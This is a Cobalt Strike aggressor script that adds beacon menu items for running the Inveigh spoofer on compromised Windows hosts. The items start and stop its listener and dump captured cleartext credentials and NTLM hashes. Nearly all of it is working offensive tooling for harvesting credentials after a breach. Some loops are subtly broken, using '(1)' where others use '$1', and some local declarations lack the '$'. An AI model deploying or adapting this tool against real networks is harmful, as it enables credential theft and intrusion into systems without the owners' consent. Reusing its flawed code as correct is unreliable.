# Adds menu driven support for inveigh
# No HTTPS, Inveigh-Relay or Inveigh-Bruteforce support at this time
# @Und3rf10w

popup beacon_bottom {
	menu "Inveigh"{
		item "Start Inveigh Listener" {
			# Load and execute specifying a specific local listening/spoofing IP using default settings
			# Prompt user to confirm that the IP address for the beacon is correct.
			local('$bid');
			foreach $bid ($1){
				$beacon_ip = binfo($bid, 'internal');
				prompt_text("What is the internal IP address of this beacon?", "$beacon_ip", {
					binput($bid, "powershell-import " . script_resource("inveigh/Scripts/Inveigh.ps1"));
					bpowershell_import($bid, script_resource("inveigh/Scripts/Inveigh.ps1"));
					binput($bid, "powershell Invoke-Inveigh -IP " . $beacon_ip . "-OutputStreamOnly Y -Tool 1");
					bpowershell($bid, "Invoke-Inveigh -IP " . $beacon_ip . " -OutputStreamOnly Y -Tool 1");
					bnote($bid, "Active Inveigh Listener");
				});
			}
		}
		item "Stop Inveigh Listener" {
			# Stops Inveigh listener for specified beacon session
			local('bid');
			foreach $bid ($1) {
				binput($bid, "powershell-import " . script_resource("inveigh/Scripts/Inveigh.ps1"));
				binput($bid, "powershell Stop-Inveigh");
				bpowershell_import($bid, script_resource("inveigh/Scripts/Inveigh.ps1"));
				bpowershell($bid, 'Stop-Inveigh');
				bnote($bid, "");
			}
		}
		menu "Inveigh Listener" {
			# Use this menu to get the queued output of the Inveigh listener
			item "Listener Stats" {
				# Shows statistics for the Inveigh Listener
				local('bid');
				foreach $bid (1) {
					binput($bid, "powershell Get-InveighStat")
				}
			}
			item "Show Inveigh Queued Output" {
				# Runs Get-Inveigh, grabbing all queued output
				local('bid');
				foreach $bid (1) {
					binput($bid, "powershell Get-Inveigh");
					bpowershell($bid, "Get-Inveigh");
				}
			}
			item "Show Captured Cleartext Credentials"{
				# Runs Get-InveighCleartext, showing all cleartext captured credentials
				local('bid');
				foreach $bid (1) {
					binput($bid, "powershell Get-InveighCleartext");
					bpowershell($bid, "Get-InveighCleartext");
				}
			}
			item "Show Captured NTLM Hashes" {
				# Runs Get-InveighNTLM, showing all captured challenge/response hashes, v1 and v2
				local('bid');
				foreach $bid (1) {
					binput($bid, "powershell Get-InveighNTLM");
					bpowershell($bid, "Get-InveighNTLM");
				}
			}
		}
	}
}